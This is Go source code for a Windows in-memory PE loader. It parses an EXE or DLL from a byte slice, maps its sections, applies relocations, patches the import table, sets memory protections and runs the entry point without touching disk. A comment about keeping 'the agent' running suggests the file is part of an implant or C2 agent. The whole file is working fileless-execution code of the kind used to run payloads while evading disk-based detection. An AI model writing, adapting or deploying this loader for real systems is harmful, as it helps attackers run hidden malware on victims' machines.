//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// In-memory PE loader.
//
// Loads a Windows PE (EXE or DLL) from a byte slice entirely in memory,
// without writing to disk.  Steps:
//
//  1. Parse DOS/PE headers.
//  2. VirtualAlloc at the preferred base (or anywhere if base is taken).
//  3. Copy section data to their RVA offsets.
//  4. Apply base relocations if the image did not land at ImageBase.
//  5. Resolve the import directory (IAT patching).
//  6. Set per-section memory protections.
//  7. Call DllMain (DLL_PROCESS_ATTACH) or the PE entry point.

// peLoad loads rawPE in-memory and, for DLLs, calls DllMain(ATTACH).
// For EXEs it calls the entry point directly (the image must be position-
// independent or have a full relocation table).
// args is passed to the entry point as lpCmdLine for EXE images.
func peLoad(rawPE []byte) (uintptr, error) {
	if len(rawPE) < 0x40 {
		return 0, fmt.Errorf("peloader: image too small")
	}

	// ── 1. Parse headers ──────────────────────────────────────────────────
	if binary.LittleEndian.Uint16(rawPE[0:2]) != 0x5A4D {
		return 0, fmt.Errorf("peloader: invalid MZ signature")
	}
	peOff := binary.LittleEndian.Uint32(rawPE[0x3C:])
	if int(peOff)+0x18 > len(rawPE) {
		return 0, fmt.Errorf("peloader: PE offset out of bounds")
	}
	if binary.LittleEndian.Uint32(rawPE[peOff:]) != 0x00004550 { // "PE\0\0"
		return 0, fmt.Errorf("peloader: invalid PE signature")
	}

	machine := binary.LittleEndian.Uint16(rawPE[peOff+4:])
	if machine != 0x8664 { // IMAGE_FILE_MACHINE_AMD64
		return 0, fmt.Errorf("peloader: only AMD64 PE is supported (got 0x%X)", machine)
	}

	numSections := binary.LittleEndian.Uint16(rawPE[peOff+6:])
	optHdrOff := peOff + 24 // sizeof(IMAGE_FILE_HEADER) = 20, +4 for sig = 24
	magic := binary.LittleEndian.Uint16(rawPE[optHdrOff:])
	if magic != 0x020B { // PE32+
		return 0, fmt.Errorf("peloader: expected PE32+ optional header (got 0x%X)", magic)
	}

	// Optional header fields (PE32+).
	imageBase := binary.LittleEndian.Uint64(rawPE[optHdrOff+24:])
	sizeOfImage := binary.LittleEndian.Uint32(rawPE[optHdrOff+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(rawPE[optHdrOff+60:])
	entryPointRVA := binary.LittleEndian.Uint32(rawPE[optHdrOff+16:])
	isDLL := binary.LittleEndian.Uint16(rawPE[peOff+22:])&0x2000 != 0

	// Relocation directory (data directory index 5).
	relocRVA := binary.LittleEndian.Uint32(rawPE[optHdrOff+128:])
	relocSize := binary.LittleEndian.Uint32(rawPE[optHdrOff+132:])

	// Import directory (data directory index 1).
	importRVA := binary.LittleEndian.Uint32(rawPE[optHdrOff+104:])

	// ── 2. Allocate memory ────────────────────────────────────────────────
	// Try preferred base first; fall back to any address.
	allocBase, _, _ := procVirtualAllocEx.Call(
		uintptr(^uintptr(0)-1), // NtCurrentProcess
		uintptr(imageBase),
		uintptr(sizeOfImage),
		uintptr(memCommit|memReserve),
		uintptr(pageReadWrite),
	)
	if allocBase == 0 {
		allocBase, _, _ = procVirtualAllocEx.Call(
			uintptr(^uintptr(0)-1),
			0,
			uintptr(sizeOfImage),
			uintptr(memCommit|memReserve),
			uintptr(pageReadWrite),
		)
	}
	if allocBase == 0 {
		return 0, fmt.Errorf("peloader: VirtualAlloc(%d bytes) failed", sizeOfImage)
	}

	// ── 3. Copy headers + sections ────────────────────────────────────────
	hdrDst := unsafe.Slice((*byte)(unsafe.Pointer(allocBase)), sizeOfHeaders)
	copy(hdrDst, rawPE[:sizeOfHeaders])

	sectionTableOff := uintptr(optHdrOff) + 240 // PE32+ optional header size = 240
	for i := 0; i < int(numSections); i++ {
		sec := rawPE[sectionTableOff+uintptr(i)*40:]
		virtualAddr := binary.LittleEndian.Uint32(sec[12:])
		virtualSize := binary.LittleEndian.Uint32(sec[8:])
		rawOff := binary.LittleEndian.Uint32(sec[20:])
		rawSize := binary.LittleEndian.Uint32(sec[16:])
		if rawSize == 0 {
			continue
		}
		copyLen := rawSize
		if copyLen > virtualSize {
			copyLen = virtualSize
		}
		dst := unsafe.Slice((*byte)(unsafe.Pointer(allocBase+uintptr(virtualAddr))), copyLen)
		copy(dst, rawPE[rawOff:rawOff+copyLen])
	}

	// ── 4. Base relocations ───────────────────────────────────────────────
	delta := int64(allocBase) - int64(imageBase)
	if delta != 0 && relocRVA != 0 && relocSize != 0 {
		if err := peApplyRelocs(allocBase, rawPE, relocRVA, relocSize, delta); err != nil {
			procVirtualFreeEx.Call(uintptr(^uintptr(0)-1), allocBase, 0, uintptr(memRelease))
			return 0, fmt.Errorf("peloader: relocation: %w", err)
		}
	}

	// ── 5. Import resolution (IAT patching) ───────────────────────────────
	if importRVA != 0 {
		if err := peResolveImports(allocBase, importRVA); err != nil {
			procVirtualFreeEx.Call(uintptr(^uintptr(0)-1), allocBase, 0, uintptr(memRelease))
			return 0, fmt.Errorf("peloader: imports: %w", err)
		}
	}

	// ── 6. Per-section protection ─────────────────────────────────────────
	peSetSectionProtections(allocBase, rawPE, sectionTableOff, numSections)

	// ── 7. Call entry point ───────────────────────────────────────────────
	ep := allocBase + uintptr(entryPointRVA)
	if isDLL {
		// DllMain(hModule, DLL_PROCESS_ATTACH=1, lpReserved=nil)
		syscall.SyscallN(ep, allocBase, 1, 0)
	} else {
		// EXE: call entry point in a new goroutine so the agent keeps running.
		go func() { syscall.SyscallN(ep) }()
	}

	return allocBase, nil
}

// ─── Relocations ─────────────────────────────────────────────────────────────

func peApplyRelocs(base uintptr, raw []byte, relocRVA, relocSize uint32, delta int64) error {
	off := uintptr(relocRVA)
	end := off + uintptr(relocSize)
	for off < end {
		if int(off+8) > len(raw) {
			break
		}
		pageRVA := binary.LittleEndian.Uint32(raw[off:])
		blockSize := binary.LittleEndian.Uint32(raw[off+4:])
		if blockSize < 8 {
			break
		}
		numEntries := (blockSize - 8) / 2
		for i := uint32(0); i < numEntries; i++ {
			entry := binary.LittleEndian.Uint16(raw[off+8+uintptr(i)*2:])
			relocType := entry >> 12
			relocOff := uint32(entry & 0x0FFF)
			if relocType == 10 { // IMAGE_REL_BASED_DIR64
				targetAddr := base + uintptr(pageRVA) + uintptr(relocOff)
				old := *(*int64)(unsafe.Pointer(targetAddr))
				*(*int64)(unsafe.Pointer(targetAddr)) = old + delta
			}
		}
		off += uintptr(blockSize)
	}
	return nil
}

// ─── IAT patching ────────────────────────────────────────────────────────────

func peResolveImports(base uintptr, importRVA uint32) error {
	// IMAGE_IMPORT_DESCRIPTOR is 20 bytes.
	for off := uintptr(importRVA); ; off += 20 {
		nameRVA := *(*uint32)(unsafe.Pointer(base + off + 12))
		iatRVA := *(*uint32)(unsafe.Pointer(base + off + 16))
		if nameRVA == 0 && iatRVA == 0 {
			break
		}
		dllNamePtr := (*byte)(unsafe.Pointer(base + uintptr(nameRVA)))
		dllName := hgCString(uintptr(unsafe.Pointer(dllNamePtr)))

		hDll, _, e := procLoadLibraryA.Call(
			uintptr(unsafe.Pointer(dllNamePtr)),
		)
		if hDll == 0 {
			return fmt.Errorf("LoadLibraryA(%s): %v", dllName, e)
		}

		iltRVA := *(*uint32)(unsafe.Pointer(base + off))
		if iltRVA == 0 {
			iltRVA = iatRVA
		}

		for slot := uintptr(0); ; slot += 8 {
			entry := *(*uint64)(unsafe.Pointer(base + uintptr(iltRVA) + slot))
			if entry == 0 {
				break
			}
			var procAddr uintptr
			if entry>>63 == 1 {
				// Import by ordinal
				ord := uint16(entry & 0xFFFF)
				procAddr, _ = windows.GetProcAddressByOrdinal(windows.Handle(hDll), uintptr(ord))
			} else {
				// Import by name: skip 2-byte hint, then null-terminated name.
				nameAddr := base + uintptr(uint32(entry)) + 2
				namePtr := (*byte)(unsafe.Pointer(nameAddr))
				procAddr, _ = windows.GetProcAddress(windows.Handle(hDll),
					hgCString(uintptr(unsafe.Pointer(namePtr))))
			}
			if procAddr == 0 {
				continue // best-effort
			}
			// Patch IAT entry.
			iatEntry := base + uintptr(iatRVA) + slot
			*(*uintptr)(unsafe.Pointer(iatEntry)) = procAddr
		}
	}
	return nil
}

// ─── Section protections ─────────────────────────────────────────────────────

func peSetSectionProtections(base uintptr, raw []byte, tableOff uintptr, numSec uint16) {
	for i := 0; i < int(numSec); i++ {
		sec := raw[tableOff+uintptr(i)*40:]
		virtualAddr := binary.LittleEndian.Uint32(sec[12:])
		virtualSize := binary.LittleEndian.Uint32(sec[8:])
		characteristics := binary.LittleEndian.Uint32(sec[36:])
		if virtualSize == 0 {
			continue
		}

		var prot uint32 = pageReadWrite
		exec := characteristics&0x20000000 != 0
		read := characteristics&0x40000000 != 0
		write := characteristics&0x80000000 != 0

		switch {
		case exec && write:
			prot = pageExecuteReadWrite
		case exec && read:
			prot = pageExecRead
		case exec:
			prot = pageExecRead
		case write:
			prot = pageReadWrite
		default:
			prot = 0x02 // PAGE_READONLY
		}

		var old uint32
		procVirtualProtect.Call(
			base+uintptr(virtualAddr),
			uintptr(virtualSize),
			uintptr(prot),
			uintptr(unsafe.Pointer(&old)),
		)
	}
}
